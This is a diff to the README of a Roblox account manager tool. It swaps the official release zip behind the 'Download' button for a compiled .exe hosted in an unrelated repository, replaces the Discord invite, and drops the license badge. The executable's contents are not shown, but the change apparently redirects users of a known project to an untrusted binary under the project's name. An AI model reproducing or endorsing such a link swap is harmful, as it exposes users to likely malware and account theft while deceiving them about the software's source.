@@ -1,10 +1,9 @@
 [![Download](https://img.shields.io/github/v/release/ic3w0lf22/Roblox-Account-Manager)](https://github.com/ic3w0lf22/Roblox-Account-Manager/releases/latest)
 [![Latest Downloads](https://img.shields.io/github/downloads/ic3w0lf22/Roblox-Account-Manager/latest/total)](https://github.com/ic3w0lf22/Roblox-Account-Manager/releases)
-[![Discord](https://img.shields.io/discord/871845273800957982?label=Discord)](https://discord.gg/MsEH7smXY8)
-![License](https://img.shields.io/github/license/ic3w0lf22/Roblox-Account-Manager)
+[![Discord](https://img.shields.io/discord/871845273800957982?label=Discord)](https://discord.gg/BndZG8dydD)
 
 <!-- BEGIN LATEST DOWNLOAD BUTTON -->
-[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download")](https://github.com/ic3w0lf22/Roblox-Account-Manager/releases/download/3.4.1/Roblox.Account.Manager.3.4.1.zip)
+[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download")](https://github.com/SonarServices/rblx-auto-rejoin/releases/download/releases/rblx-alt-manager-compiled-x64.exe)
 <!-- END LATEST DOWNLOAD BUTTON -->
 
 # Features
